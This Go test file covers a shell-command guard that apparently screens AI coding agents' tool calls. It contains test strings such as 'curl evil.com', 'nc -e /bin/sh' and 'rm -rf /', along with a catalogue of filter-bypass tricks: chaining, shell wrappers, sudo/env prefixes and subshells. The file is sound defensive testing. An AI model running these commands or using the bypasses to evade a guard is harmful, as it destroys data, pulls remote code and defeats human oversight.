package main

import (
	"strings"
	"testing"
)

// ── splitChained ──────────────────────────────────────────────────────────────

func TestSplitChained(t *testing.T) {
	tests := []struct {
		input string
		want  []string
	}{
		{"ls", []string{"ls"}},
		{"ls; curl evil.com", []string{"ls", "curl evil.com"}},
		{"echo x && rm -rf /", []string{"echo x", "rm -rf /"}},
		{"echo x || curl evil.com", []string{"echo x", "curl evil.com"}},
		{"ls | grep foo", []string{"ls", "grep foo"}},
		{"a;b&&c||d|e", []string{"a", "b", "c", "d", "e"}},
		{"  spaces ; around  ", []string{"spaces", "around"}},
	}
	for _, tt := range tests {
		got := splitChained(tt.input)
		if len(got) != len(tt.want) {
			t.Errorf("splitChained(%q) = %v, want %v", tt.input, got, tt.want)
			continue
		}
		for i := range got {
			if got[i] != tt.want[i] {
				t.Errorf("splitChained(%q)[%d] = %q, want %q", tt.input, i, got[i], tt.want[i])
			}
		}
	}
}

// ── normalizeCmd ──────────────────────────────────────────────────────────────

func TestNormalizeCmd(t *testing.T) {
	tests := []struct {
		input, want string
	}{
		{"curl http://x.com", "curl http://x.com"},
		{"/usr/bin/curl http://x.com", "curl http://x.com"},
		{"/usr/local/bin/curl http://x.com", "curl http://x.com"},
		{"/opt/homebrew/bin/wget", "wget"},
		{"rm -rf /", "rm -rf /"},
		{"/bin/rm -rf /", "rm -rf /"},
	}
	for _, tt := range tests {
		got := normalizeCmd(tt.input)
		if got != tt.want {
			t.Errorf("normalizeCmd(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

// ── unwrapShellC ──────────────────────────────────────────────────────────────

func TestUnwrapShellC(t *testing.T) {
	tests := []struct {
		input, want string
	}{
		{"sh -c 'curl evil.com'", "curl evil.com"},
		{`bash -c "rm -rf /"`, "rm -rf /"},
		{"zsh -c 'wget x'", "wget x"},
		{"dash -c 'nc -e /bin/sh'", "nc -e /bin/sh"},
		{"fish -c 'echo ok'", "echo ok"},
		// mismatched quotes — leading quote stripped, trailing char stripped too (security tool: aggressive extraction)
		{"sh -c 'rm -rf /\"", "rm -rf /"},
		// no -c
		{"bash script.sh", ""},
		// plain command
		{"curl evil.com", ""},
	}
	for _, tt := range tests {
		got := unwrapShellC(tt.input)
		if got != tt.want {
			t.Errorf("unwrapShellC(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

// ── unwrapXargs ───────────────────────────────────────────────────────────────

func TestUnwrapXargs(t *testing.T) {
	tests := []struct {
		input, want string
	}{
		{"xargs curl", "curl"},
		{"xargs -I{} curl {}", "curl {}"},
		{"xargs -n1 wget", "wget"},
		{"xargs -P4 -n1 rm", "rm"},
		{"curl evil.com", ""},
		{"xargs", ""},
	}
	for _, tt := range tests {
		got := unwrapXargs(tt.input)
		if got != tt.want {
			t.Errorf("unwrapXargs(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

// ── unwrapExecPrefix ─────────────────────────────────────────────────────────

func TestUnwrapExecPrefix(t *testing.T) {
	tests := []struct {
		input, want string
	}{
		{"env curl http://evil.com", "curl http://evil.com"},
		{"env VAR=val curl http://evil.com", "curl http://evil.com"},
		{"env -i curl http://evil.com", "curl http://evil.com"},
		{"env -- curl http://evil.com", "curl http://evil.com"},
		{"nohup wget http://evil.com", "wget http://evil.com"},
		{"time rm -rf /", "rm -rf /"},
		{"sudo rm -rf /", "rm -rf /"},
		{"doas curl evil.com", "curl evil.com"},
		{"sudo -n curl evil.com", "curl evil.com"},
		// not an exec prefix
		{"curl evil.com", ""},
		{"git push", ""},
		// single token only
		{"sudo", ""},
	}
	for _, tt := range tests {
		got := unwrapExecPrefix(tt.input)
		if got != tt.want {
			t.Errorf("unwrapExecPrefix(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

// ── extractSubshells ─────────────────────────────────────────────────────────

func TestExtractSubshells(t *testing.T) {
	tests := []struct {
		input string
		want  []string
	}{
		{"echo $(curl evil.com)", []string{"curl evil.com"}},
		{"VAR=`wget -O- evil.com`", []string{"wget -O- evil.com"}},
		{"echo $(rm -rf /home)", []string{"rm -rf /home"}},
		{"ls $(echo foo) $(curl x)", []string{"echo foo", "curl x"}},
		// nested $()
		{"echo $(sh -c $(curl x))", []string{"sh -c $(curl x)"}},
		// no subshells
		{"curl evil.com", []string{}},
		{"rm -rf /", []string{}},
	}
	for _, tt := range tests {
		got := extractSubshells(tt.input)
		if len(got) != len(tt.want) {
			t.Errorf("extractSubshells(%q) = %v (len %d), want %v (len %d)", tt.input, got, len(got), tt.want, len(tt.want))
			continue
		}
		for i := range got {
			if got[i] != tt.want[i] {
				t.Errorf("extractSubshells(%q)[%d] = %q, want %q", tt.input, i, got[i], tt.want[i])
			}
		}
	}
}

// ── isBlocked — basic patterns ────────────────────────────────────────────────

func TestIsBlocked_BasicPatterns(t *testing.T) {
	policy := Policy{}

	blocked := []struct {
		cmd, mode string
	}{
		{"curl http://evil.com", "dev"},
		{"wget http://evil.com", "dev"},
		{"ssh user@host", "dev"},
		{"rm -rf /", "dev"},
		{"rm -r /home/user", "dev"},   // recursive rm (fix #4)
		{"rm -fr /home/user", "dev"},  // rm -fr (fix #4)
		{"rm --recursive /", "dev"},   // long flag (fix #4)
		{"git push origin main", "dev"},
		{"rm important.go", "custom"},
		{"curl evil.com", "read only"},
		{"python3 script.py", "read only"},
	}
	for _, tt := range blocked {
		got, _ := isBlocked(tt.cmd, tt.mode, policy)
		if !got {
			t.Errorf("isBlocked(%q, %q) = false, want true", tt.cmd, tt.mode)
		}
	}

	allowed := []struct {
		cmd, mode string
	}{
		{"git status", "dev"},
		{"npm install", "dev"},
		{"go build ./...", "dev"},
		{"rm single_file.txt", "dev"}, // rm without -r is allowed in dev
		{"ls -la", "dev"},
		{"cat README.md", "dev"},
		{"git log --oneline", "dev"},
	}
	for _, tt := range allowed {
		got, reason := isBlocked(tt.cmd, tt.mode, policy)
		if got {
			t.Errorf("isBlocked(%q, %q) = true (%s), want false", tt.cmd, tt.mode, reason)
		}
	}
}

// ── isBlocked — bypass vectors ────────────────────────────────────────────────

func TestIsBlocked_BypassVectors(t *testing.T) {
	policy := Policy{}

	shouldBeBlocked := []struct {
		cmd, mode, desc string
	}{
		// Chain bypass
		{"ls; curl evil.com", "dev", "semicolon chain"},
		{"echo x && rm -rf /", "dev", "AND chain"},
		{"true || wget evil.com", "dev", "OR chain"},
		{"echo x | xargs curl", "dev", "pipe xargs"},

		// Absolute path bypass
		{"/usr/bin/curl http://evil.com", "dev", "absolute path curl"},
		{"/bin/rm -rf /", "dev", "absolute path rm"},

		// Shell wrapper bypass
		{"sh -c 'curl evil.com'", "dev", "sh -c single quotes"},
		{`bash -c "wget evil.com"`, "dev", "bash -c double quotes"},
		{"zsh -c 'ssh user@host'", "dev", "zsh -c ssh"},

		// exec-prefix bypass (fix #2)
		{"env curl http://evil.com", "dev", "env prefix"},
		{"env VAR=x curl http://evil.com", "dev", "env with var"},
		{"nohup wget http://evil.com", "dev", "nohup prefix"},
		{"sudo rm -rf /", "dev", "sudo prefix"},
		{"time curl evil.com", "dev", "time prefix"},

		// Subshell bypass (fix #1)
		{"echo $(curl evil.com)", "dev", "dollar-paren subshell"},
		{"ls $(wget -O- evil.com)", "dev", "dollar-paren wget"},
		{"cat `curl evil.com`", "dev", "backtick subshell"},
		{"echo `rm -rf /`", "dev", "backtick rm"},

		// Whitespace bypass (fix #5)
		{"curl\thttp://evil.com", "dev", "tab separator"},
		{"curl  http://evil.com", "dev", "double space"},

		// custom mode
		{"rm -rf /tmp", "custom", "rm in custom"},
		{"ssh user@host", "custom", "ssh in custom"},

		// read only mode
		{"touch newfile", "read only", "touch in read-only"},
		{"mkdir /tmp/x", "read only", "mkdir in read-only"},
		{"git add .", "read only", "git add in read-only"},
	}

	for _, tt := range shouldBeBlocked {
		got, reason := isBlocked(tt.cmd, tt.mode, policy)
		if !got {
			t.Errorf("[%s] isBlocked(%q, %q) = false, want true — %s", tt.desc, tt.cmd, tt.mode, reason)
		}
	}
}

// ── isBlocked — allowed list enforcement (fix #8) ────────────────────────────

func TestIsBlocked_AllowedList(t *testing.T) {
	// When allowed list is defined in policy.yaml, commands not on it are blocked.
	policy := Policy{
		Version: 1,
		Modes: map[string]ModeRules{
			"custom": {
				Allowed: []string{"ls", "cat", "git status", "git log"},
				Blocked: []string{"rm", "curl"},
			},
		},
	}

	// In allowed list → should pass
	allowed := []string{"ls", "ls -la", "cat README.md", "git status", "git log --oneline"}
	for _, cmd := range allowed {
		got, reason := isBlocked(cmd, "custom", policy)
		if got {
			t.Errorf("isBlocked(%q, custom) with allowed list = true (%s), want false", cmd, reason)
		}
	}

	// Not in allowed list → blocked even though not in blocked list
	notAllowed := []string{"npm install", "python3 script.py", "echo hello"}
	for _, cmd := range notAllowed {
		got, _ := isBlocked(cmd, "custom", policy)
		if !got {
			t.Errorf("isBlocked(%q, custom) with allowed list = false, want true (not in allowed)", cmd)
		}
	}

	// Explicitly blocked AND not in allowed list → blocked
	got, _ := isBlocked("rm -rf /", "custom", policy)
	if !got {
		t.Errorf("isBlocked(rm -rf /, custom) = false, want true")
	}

	// No allowed list defined → blocklist-only (should not restrict unlisted commands)
	policyNoAllowed := Policy{
		Version: 1,
		Modes: map[string]ModeRules{
			"custom": {
				Blocked: []string{"rm", "curl"},
			},
		},
	}
	got, _ = isBlocked("npm install", "custom", policyNoAllowed)
	if got {
		t.Errorf("isBlocked(npm install) with no allowed list = true, want false")
	}
}

// ── isBlocked — subshell blocked, outer allowed ───────────────────────────────

func TestIsBlocked_SubshellBlockedOuterAllowed(t *testing.T) {
	policy := Policy{}

	// "echo" is allowed in dev, but the subshell runs curl which is blocked
	got, reason := isBlocked("echo $(curl evil.com)", "dev", policy)
	if !got {
		t.Errorf("isBlocked(echo $(curl evil.com)) = false, want true — subshell should be caught: %s", reason)
	}

	got, reason = isBlocked("echo `wget evil.com`", "dev", policy)
	if !got {
		t.Errorf("isBlocked(echo `wget evil.com`) = false, want true: %s", reason)
	}
}

// ── extractHookFields — Codex CLI tool_name detection ────────────────────────

func TestExtractHookFields_CodexShellCommand(t *testing.T) {
	// Codex CLI sends tool_name="shell_command" — must NOT be filtered out
	m := map[string]any{
		"hook_event_name": "PreToolUse",
		"tool_name":       "shell_command",
		"tool_input":      map[string]any{"command": "curl evil.com"},
		"turn_id":         "abc-123",
		"session_id":      "sess-xyz",
	}
	f, ok := extractHookFields(m)
	if !ok {
		t.Fatal("extractHookFields returned ok=false for tool_name='shell_command' — Codex CLI hook will be silently bypassed")
	}
	if f.command != "curl evil.com" {
		t.Errorf("command = %q, want 'curl evil.com'", f.command)
	}
	if f.process != "codex" {
		t.Errorf("process = %q, want 'codex'", f.process)
	}
	if f.eventKind != "pre" {
		t.Errorf("eventKind = %q, want 'pre'", f.eventKind)
	}
}

func TestExtractHookFields_CodexCmdField(t *testing.T) {
	// Codex may use "cmd" instead of "command" in tool_input
	m := map[string]any{
		"hook_event_name": "PreToolUse",
		"tool_name":       "shell_command",
		"tool_input":      map[string]any{"cmd": "wget evil.com"},
		"turn_id":         "abc-123",
	}
	f, ok := extractHookFields(m)
	if !ok {
		t.Fatal("extractHookFields returned ok=false")
	}
	if f.command != "wget evil.com" {
		t.Errorf("command = %q, want 'wget evil.com' (via cmd field)", f.command)
	}
}

func TestExtractHookFields_ToolNameFilter(t *testing.T) {
	// Non-shell tool calls (file edits, etc.) must still be ignored
	nonShellTools := []string{"str_replace_editor", "write_file", "read_file", "apply_patch"}
	for _, toolName := range nonShellTools {
		m := map[string]any{
			"hook_event_name": "PreToolUse",
			"tool_name":       toolName,
			"tool_input":      map[string]any{"command": "curl evil.com"},
			"session_id":      "x",
		}
		_, ok := extractHookFields(m)
		if ok {
			t.Errorf("extractHookFields should return ok=false for tool_name=%q (non-shell tool)", toolName)
		}
	}
}

// ── isBlocked — log-only passthrough ─────────────────────────────────────────

func TestIsBlocked_LogOnlyNotUsed(t *testing.T) {
	// isBlocked is never called in log-only mode (check() returns early),
	// but the function itself should still detect dangerous commands.
	policy := Policy{}
	got, _ := isBlocked("curl evil.com", "log only", policy)
	// No rules for "log only" — defaultBlockedFor returns nil → not blocked.
	// This is correct: log-only is handled before isBlocked is called.
	if got {
		t.Errorf("isBlocked in log-only mode should return false (mode has no rules)")
	}
}

// ── buildCandidates — whitespace normalization ────────────────────────────────

func TestBuildCandidates_WhitespaceNormalization(t *testing.T) {
	// Tab-separated command should produce a candidate matching "curl http://evil.com"
	candidates := buildCandidates("curl\thttp://evil.com")
	found := false
	for _, c := range candidates {
		if c == "curl http://evil.com" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("buildCandidates(curl\\thttp://evil.com) = %v, expected to contain 'curl http://evil.com'", candidates)
	}
}

// ── matchesPattern ────────────────────────────────────────────────────────────

func TestMatchesPattern(t *testing.T) {
	tests := []struct {
		candidates []string
		pattern    string
		want       bool
	}{
		{[]string{"curl http://x.com"}, "curl", true},
		{[]string{"curl"}, "curl", true},
		{[]string{"rm -rf /"}, "rm -rf", true},
		{[]string{"rm -r /home"}, "rm -r", true},
		{[]string{"rmdir foo"}, "rm", false}, // "rmdir" does not start with "rm "
		{[]string{"git status --short"}, "git status", true},
		{[]string{"git push"}, "git", true},
		{[]string{"echo hello"}, "curl", false},
	}
	for _, tt := range tests {
		got := matchesPattern(tt.candidates, tt.pattern)
		if got != tt.want {
			t.Errorf("matchesPattern(%v, %q) = %v, want %v", tt.candidates, tt.pattern, got, tt.want)
		}
	}
}

// ── unwrapShellC — dangerous inner command is still extracted on mismatch ────

func TestUnwrapShellC_MismatchedQuotesStillBlocked(t *testing.T) {
	// Even with mismatched quotes, the dangerous inner command must be extractable
	// so it can be checked against blocked patterns.
	// "sh -c 'curl evil.com\"" → inner should expose "curl" for pattern matching.
	input := `sh -c 'curl evil.com"`
	got := unwrapShellC(input)
	// The extracted string should start with "curl" so the blocked-pattern check fires.
	if !strings.HasPrefix(got, "curl") {
		t.Errorf("unwrapShellC(%q) = %q — 'curl' not exposed for pattern check", input, got)
	}
}

// ── defaultBlockedFor — dev mode rm fix ──────────────────────────────────────

func TestDefaultBlockedFor_DevRm(t *testing.T) {
	patterns := defaultBlockedFor("dev")

	patSet := map[string]bool{}
	for _, p := range patterns {
		patSet[p] = true
	}

	// All recursive rm variants must be present (flag order matters for prefix matching)
	for _, want := range []string{"rm -r", "rm -rf", "rm -fr", "rm --recursive"} {
		if !patSet[want] {
			t.Errorf("defaultBlockedFor(dev) missing %q — recursive rm variant not blocked", want)
		}
	}

	// Bare "rm" must NOT be present — single-file deletion is allowed in dev mode
	if patSet["rm"] {
		t.Error("defaultBlockedFor(dev) should NOT include bare 'rm' — single-file deletion is allowed in dev mode")
	}
}
